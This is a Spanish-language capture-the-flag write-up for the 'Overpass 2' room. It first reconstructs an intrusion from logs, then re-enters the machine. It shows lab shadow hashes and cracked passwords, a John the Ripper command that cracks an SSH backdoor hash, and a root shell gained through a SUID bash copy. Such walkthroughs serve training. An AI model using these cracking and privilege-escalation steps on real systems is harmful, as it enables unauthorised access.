# Overpass 2
Room muy guapa, mezcla forensic y pentesting
## Log Analysys

Mediante el analasis de los logs podemos saber exactamente el metodo usado en la intrusión

Vemos que en /development se ha subido una rev shell a la que se ha accedido bajo el endpoint /uploads/ 

Una vez dentro el atacante invoco una TTY, y desde ella paso al user james usando las siguientes creds
```
james:whenevernoteartinstant
```
Mediante sudo -l pudo ver que james podia ejecutar cualquier comado como sudoer
```
User james may run the following commands on overpass-production:
    (ALL : ALL) ALL
```
Tras esto leyo /etc/shadow en busca de las contraseñas de otros usuarios
```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```
Encontro esos 5 hashes e instalo la siguiente backdoor
```
https://github.com/NinjaJc01/ssh-backdoor
```
Analizando el codigo encontrasmos el salt por defecto usado , y desde el pcap vemos que ha cambiado el hash por otro
```
SALT: 1c362db832f3f864c8c2fe05f2002a05
HASH: 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```


## Intial Scan
```
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
```
## Enum
Tenemos del los logs 5 hashes para un acceso inicial asi como la password de james, podemos intentar dehashear los hashes y ver si podemos acceder por ahi
```
muirland:1qaz2wsx
szymex:abcd123
bee:secret12 
paradox:secuirty3     
james:whenevernoteartinstant
```
Parece que no va por ahi, veamos entonces si seguimos teniendo el file upload, lo comprobamos y lo han quitado, veamos si podemos crackear entonces la pass del backdoor
La almacenamos tal que asi en un archivo:
```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05
```
Y la crackeamos asi:
```
/home/pj/.JohnTheRipper/run/john hashbackdoor.txt --wordlist=/home/pj/rockyou.txt --format='dynamic=sha512($p.$s)'
```
Con esta información intentemos entrar nosotros, pero por el puerto 2222

## Privesc 
Tenemos shell como james pero parece que no podemos checkear nuestros permisos para ejecutar comandos como sudo ya que nos han cambiado la contraseña :c
Si listamos todo el directorio veremos un archivo raro
```
-rwsr-sr-x 1 root  root  1113504 Jul 22 02:57 .suid_bash
```
Este SUID file es una copia de /bin/bash , ponemos el flag -p 
```
./.suid_bash -p
#id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
```
